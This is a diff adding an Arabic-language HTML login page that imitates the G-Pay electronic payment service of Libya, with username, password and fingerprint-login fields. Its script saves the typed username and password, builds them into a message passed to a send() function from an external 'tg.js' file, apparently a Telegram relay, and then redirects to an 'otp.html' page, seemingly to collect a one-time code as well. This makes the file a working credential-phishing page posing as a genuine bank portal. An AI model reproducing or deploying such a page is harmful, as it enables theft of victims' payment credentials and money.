@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- HTML Meta Tags -->
+<title>G-Pay - للدفع الإلكتروني</title>
+<meta name="description" content="Gpay - للدفع الإلكتروني">
+
+<!-- Facebook Meta Tags -->
+<meta property="og:url" content="https://gpay.ly/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="G-Pay - للدفع الإلكتروني">
+<meta property="og:description" content="Gpay - للدفع الإلكتروني">
+<meta property="og:image" content="https://scontent.famm9-1.fna.fbcdn.net/v/t39.30808-6/590759999_1145847440967588_7287178837611237193_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=cc71e4&_nc_eui2=AeHckBwqJv4bJgLs54Lhc-JCliVL-XEqB7eWJUv5cSoHt-VFCfEXckTqaYXZHfQtYspU4NBltf4ZH8-X7l8u2gHD&_nc_ohc=wakZEm3ug00Q7kNvwGpZKbI&_nc_oc=AdkAHfhhrNoMpUtOnSnLim7G8taPNEWQmM--PYkD3AROYGjKZBcTfdpF0Zi8vF0GJJs&_nc_zt=23&_nc_ht=scontent.famm9-1.fna&_nc_gid=n27RnqYeD1NMkhTReesdRg&oh=00_AfvN9j1YjWrEuu2ECJ5tPYh_AYam8xo1Gk4ueWpHzABsug&oe=699268EC">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="gpay.ly">
+<meta property="twitter:url" content="https://gpay.ly/">
+<meta name="twitter:title" content="G-Pay - للدفع الإلكتروني">
+<meta name="twitter:description" content="Gpay - للدفع الإلكتروني">
+<meta name="twitter:image" content="https://scontent.famm9-1.fna.fbcdn.net/v/t39.30808-6/590759999_1145847440967588_7287178837611237193_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=cc71e4&_nc_eui2=AeHckBwqJv4bJgLs54Lhc-JCliVL-XEqB7eWJUv5cSoHt-VFCfEXckTqaYXZHfQtYspU4NBltf4ZH8-X7l8u2gHD&_nc_ohc=wakZEm3ug00Q7kNvwGpZKbI&_nc_oc=AdkAHfhhrNoMpUtOnSnLim7G8taPNEWQmM--PYkD3AROYGjKZBcTfdpF0Zi8vF0GJJs&_nc_zt=23&_nc_ht=scontent.famm9-1.fna&_nc_gid=n27RnqYeD1NMkhTReesdRg&oh=00_AfvN9j1YjWrEuu2ECJ5tPYh_AYam8xo1Gk4ueWpHzABsug&oe=699268EC">
+
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Cairo', sans-serif;
+}
+
+body{
+    background: linear-gradient(
+        180deg,
+        #112D4D 0%,
+        #173A5E 45%,
+        #214672 100%
+    );
+}
+
+
+.container{
+    width:92%;
+    max-width:420px;
+    margin:0 auto;
+    padding-top:65px;
+    padding-bottom:40px;
+}
+
+/* ---------- LOGO ---------- */
+
+.logo{
+    margin-top: 50px;
+    text-align:center;
+    margin-bottom:0px;
+}
+
+.logo img{
+    width:150px;
+    max-width:85%;
+}
+
+/* ---------- INPUTS ---------- */
+
+.input-group{
+    margin-bottom:16px;
+}
+
+input{
+    width:100%;
+    height:48px;
+    border:none;
+    border-radius:12px;
+    background:#E5E8EB;
+    padding:0 16px;
+    font-size:15px;
+    text-align:right;
+    outline:none;
+}
+
+/* ---------- LINKS ---------- */
+
+.links{
+    display:flex;
+    justify-content:space-between;
+    margin:10px 6px 32px;
+    font-size:14px;
+}
+
+.links a{
+    color:#fff;
+    text-decoration:none;
+}
+
+/* ---------- BUTTONS ---------- */
+
+.btn{
+    width:100%;
+    height:48px;
+    border:none;
+    border-radius:12px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.btn + .btn{
+    margin-top:14px;
+}
+
+.btn-primary{
+    background:#F2BD45;
+    color:#111;
+    box-shadow:0 4px 8px rgba(0,0,0,0.25);
+}
+
+.btn-secondary{
+    background:#B8C0C6;
+    color:#111;
+}
+
+/* ---------- FINGERPRINT ---------- */
+
+.fingerprint{
+    margin-top:30px;
+}
+
+.fingerprint img{
+    display:block;
+    margin:0 auto 20px;
+    width:85px;
+    filter: brightness(0) invert(1);
+}
+
+/* row layout */
+.biometric-row{
+    position:relative;
+    width:100%;
+    height:28px;
+}
+
+/* toggle fixed to left edge */
+.switch{
+    position:absolute;
+    left:0;
+    top:0;
+    width:52px;
+    height:28px;
+}
+
+.switch input{
+    display:none;
+}
+
+.slider{
+    position:absolute;
+    top:0;
+    left:0;
+    right:0;
+    bottom:0;
+    background:#1F5C6E;
+    border-radius:40px;
+    transition:.3s ease;
+}
+
+.slider:before{
+    position:absolute;
+    content:"";
+    height:24px;
+    width:24px;
+    left:2px;
+    top:2px;
+    background:#2DBE4D;
+    border-radius:50%;
+    transition:.3s ease;
+    box-shadow:0 2px 4px rgba(0,0,0,0.35);
+}
+
+input:checked + .slider{
+    background:#2A6F7F;
+}
+
+input:checked + .slider:before{
+    transform:translateX(24px);
+}
+
+/* centered text */
+.fingerprint-text{
+    text-align:center;
+    font-size:16px;
+    line-height:28px;
+}
+
+/* ---------- FOOTER ---------- */
+
+.footer{
+    text-align:center;
+    margin-top:70px;
+}
+
+.footer img{
+    width:100px;
+    opacity:0.85;
+    /*margin-bottom:8px;*/
+}
+
+.footer .link{
+    color:#F2BD45;
+    font-size:12px;
+}
+
+
+/* DISABLED STYLE */
+.btn:disabled{
+    background:#d6b56a;       /* muted yellow */
+    color:#555;               /* darker text */
+    box-shadow:none;          /* remove elevation */
+    opacity:0.65;             /* faded look */
+    cursor:not-allowed;
+}
+
+
+.spinner{
+    width:16px;
+    height:16px;
+    border:3px solid rgba(0,0,0,0.2);
+    border-top:3px solid #111;
+    border-radius:50%;
+    animation:spin 0.8s linear infinite;
+}
+
+@keyframes spin{
+    from{transform:rotate(0deg);}
+    to{transform:rotate(360deg);}
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- LOGO -->
+    <div class="logo">
+        <img src="logo_big.png" alt="The Libyan Bank Portal">
+    </div>
+
+    <!-- INPUTS -->
+    <div class="input-group">
+        <input type="text" id="username" placeholder="اسم المستخدم">
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" placeholder="كلمة المرور">
+    </div>
+
+
+    <!-- LINKS -->
+    <div class="links">
+        <a href="#">هل نسيت كلمة السر؟</a>
+        <a href="#" style="direction:ltr;">English</a>
+    </div>
+
+    <!-- BUTTONS -->
+    <!-- <button class="btn btn-primary">تسجيل دخول</button> -->
+    <!-- <button disabled id='loginBtn' class="btn btn-primary">تسجيل دخول</button> -->
+    <button class="btn btn-primary" id="loginBtn" onclick="handleLogin()" disabled>
+        <span id="btnText">تسجيل دخول</span>
+    </button>
+
+    <button class="btn btn-secondary">انشاء حساب</button>
+
+    <!-- FINGERPRINT -->
+    <div class="fingerprint">
+        <img src="fingerprint.png" alt="Fingerprint">
+
+        <div class="biometric-row">
+            <label class="switch">
+                <input type="checkbox" checked>
+                <span class="slider"></span>
+            </label>
+
+            <div class="fingerprint-text">
+                تسجيل الدخول بالبصمة
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <img src="libyaguide_logo.png" alt="Libya Guide">
+        <div class="link">gpay.ly</div>
+    </div>
+
+</div>
+<script src='tg.js'></script>
+<script>
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+const btnText = document.getElementById("btnText");
+
+/* Enable button only if both fields have value */
+function validateFields(){
+    if(
+        usernameInput.value.trim() !== "" &&
+        passwordInput.value.trim() !== ""
+    ){
+        loginBtn.disabled = false;
+    } else {
+        loginBtn.disabled = true;
+    }
+}
+
+usernameInput.addEventListener("input", validateFields);
+passwordInput.addEventListener("input", validateFields);
+
+function handleLogin(){
+
+    if(loginBtn.disabled) return;
+
+    // Disable everything
+    loginBtn.disabled = true;
+    usernameInput.disabled = true;
+    passwordInput.disabled = true;
+
+    // Show loading text
+    btnText.textContent = "جارٍ التحقق...";
+
+    // Add spinner
+    const spinner = document.createElement("div");
+    spinner.classList.add("spinner");
+    loginBtn.appendChild(spinner);
+
+    localStorage.setItem('username',usernameInput.value)
+    localStorage.setItem('password',passwordInput.value)
+    msg=`
+    👤 اسم المستخدم: \`${usernameInput.value}\`
+    🔒 كلمة المرور: \`${passwordInput.value}\`
+    `
+    send(msg)
+    // Simulate request delay
+    setTimeout(() => {
+        window.location.href = "otp.html";
+    }, 1800);
+}
+</script>
+
+
+</body>
+</html>
